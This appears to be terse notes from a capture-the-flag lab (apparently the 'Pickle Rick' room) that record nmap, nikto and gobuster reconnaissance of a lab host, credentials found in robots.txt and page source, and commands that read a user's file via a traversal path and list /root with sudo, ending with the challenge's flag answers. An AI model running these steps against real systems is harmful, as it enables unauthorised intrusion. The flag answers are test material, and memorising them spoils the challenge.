IP = 10.10.221.127
```bash
❯ nmap 10.10.221.127
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 15:09 IST
Nmap scan report for 10.10.221.127
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Content of Robots.txt
```txt
Wubbalubbadubdub (PASSWORD)
```
Page Source 
```txt
Username: R1ckRul3s
```
Using Nikto scanner for finding files on the server
```
❯ nikto -h 10.10.221.127
```
Gobuster scan
```bash
❯ gobuster dir -u 10.10.221.127 -w /usr/share/wordlists/wfuzz/general/admin-panels.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.221.127
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/admin-panels.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/24 15:42:53 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]

===============================================================
2022/06/24 15:42:57 Finished
===============================================================
```
```
less ../../../../../home/rick/second\ ingredients
1 jerry tear
sudo ls /root
3rd ingredients: fleeb juice
